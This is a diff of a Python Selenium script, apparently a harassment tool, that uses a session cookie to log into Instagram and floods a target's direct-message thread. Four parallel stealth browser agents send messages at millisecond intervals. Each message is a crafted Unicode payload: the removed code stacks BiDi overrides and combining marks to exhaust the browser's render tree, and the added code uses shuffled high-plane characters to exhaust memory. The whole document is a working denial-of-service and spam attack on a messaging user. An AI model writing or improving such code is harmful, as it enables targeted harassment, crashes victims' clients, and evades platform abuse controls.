@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (CHAT-FREEZE V76)
-# 📅 STATUS: COMPOSITOR-LOCK | 4-AGENT TOTAL | AWS-HARD-KILL
+# 🚀 PROJECT: PRAVEER.OWNS (ENTROPY-STORM V77)
+# 📅 STATUS: RAM-FRAGMENTATION-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -9,36 +9,35 @@ from selenium_stealth import stealth
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 
-# --- ⚡ VELOCITY & FREEZE CONFIG ---
+# --- ⚡ VELOCITY & KILL CONFIG ---
 AGENTS_PER_MACHINE = 4             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.01, 0.08)  # 🔥 Hyper-Velocity Strike
-REST_AFTER_STRIKES = 500   
+BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM PACKET VELOCITY
+REST_AFTER_STRIKES = 300   
 REST_DURATION = 1          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_chat_freeze_payload():
-    """Generates a payload that targets the GPU's Command Buffer and Render Tree."""
-    u_id = random.randint(100, 999)
-    # \u202D = BDO (BiDi Override) | \u2068 = FSI (Isolate)
-    # \u034F = CGJ (Combining Joiner) | \u200D = ZWJ
-    bdo, fsi, pdi, cgj, zwj = "\u202D", "\u2068", "\u2069", "\u034F", "\u200D"
-    marks = "".join([chr(i) for i in range(0x0300, 0x0350)]) # Stacking marks
-    glue = "\u2060" 
+def get_entropy_storm_payload():
+    """Generates unique, high-entropy data to shatter browser memory management."""
+    u_id = random.randint(1000, 9999)
+    # High-plane characters (4 bytes) that force unique memory allocation
+    # 𒀱 = Cuneiform | ﷽ = Wide Ligature | 𒈙 = Complexity
+    heavy_pool = ["𒀱", "﷽", "𒈙", "𒈓", "𒈔", "🌙", "👑", "𝕻", "𝕬", "𝕰", "𝕽"]
+    glue = "\u2060" # Word Joiner
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [TOTAL_STUCK:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STORM_ID:{u_id}]"
     
     body = []
-    # 450 lines - Absolute limit of the Instagram Socket
+    # 450 lines of unique, non-compressible memory blocks
     for i in range(450):
-        # We create a 'Depth Bomb'. 
-        # Nesting BDO inside FSI forces the browser to create a new layer 
-        # for every word. This exhausts the GPU's Layer Tree.
-        line = f"{fsi}{bdo}P{marks}R{marks}A{marks}V{marks}EER{cgj}{zwj*4}{pdi}"
-        body.append(f"{line} 👑 {i}{glue*5}")
+        # Shuffling ensures the browser cannot 'intern' the string.
+        # Every message is a fresh 10KB memory allocation.
+        random.shuffle(heavy_pool)
+        line = f"PRAVEER PAPA {''.join(heavy_pool * 5)} {i}{glue*4}"
+        body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
 
@@ -59,7 +58,7 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Direct DOM injection with hardware-event spoofing."""
+    """Direct DOM injection that bypasses UI thread priority queues."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
@@ -86,27 +85,27 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(15) 
+            time.sleep(12) 
             
             strike_count = 0
             while True:
-                payload = get_chat_freeze_payload()
+                payload = get_entropy_storm_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Freeze-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Storm-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 150 == 0:
+                    if strike_count % 100 == 0:
                         driver.refresh()
-                        time.sleep(8)
+                        time.sleep(5)
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             try: driver.quit()
             except: pass
-            time.sleep(3)
+            time.sleep(2)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
